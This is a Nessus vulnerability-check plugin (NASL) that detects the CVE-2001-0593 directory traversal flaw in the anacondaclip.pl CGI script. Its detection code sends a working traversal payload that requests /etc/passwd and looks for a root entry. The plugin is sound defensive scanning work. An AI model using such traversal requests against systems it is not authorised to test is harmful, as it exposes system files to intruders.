#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10644);
 script_bugtraq_id(2512);
 script_osvdb_id(533);
 script_cve_id("CVE-2001-0593");
 script_version ("$Revision: 1.30 $");
 script_name(english:"Ananconda Partners Clipper anacondaclip.pl Traversal Arbitrary File Access");
 script_summary(english:"Checks for the presence of anacondaclip.pl");

 script_set_attribute(attribute:"synopsis", value:
"The remote host contains a Perl script which is affected by a
directory traversal vulnerability." );
 script_set_attribute(attribute:"description", value:
"The CGI script 'anacondaclip', which comes with anacondaclip.pl, is
installed on this machine. This CGI has a well-known security flaw
that allows an attacker to read arbitrary files on the remote system
with the privileges of the HTTP daemon (usually root or nobody)." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2001/Mar/422" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2001/03/28");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/03/27");
 script_cvs_date("$Date: 2016/10/07 13:30:46 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2001-2016 Tenable Network Security, Inc.");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
r = http_send_recv3(method:"GET", port: port,
  item:string(dir, "/anacondaclip.pl?template=../../../../../../../../../../../../../../../etc/passwd"));
if (isnull(r)) exit(0);
buf = strcat(r[0], r[1], '\r\n', r[2]);
if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf)){
	security_warning(port);
	exit(0);
	}
}
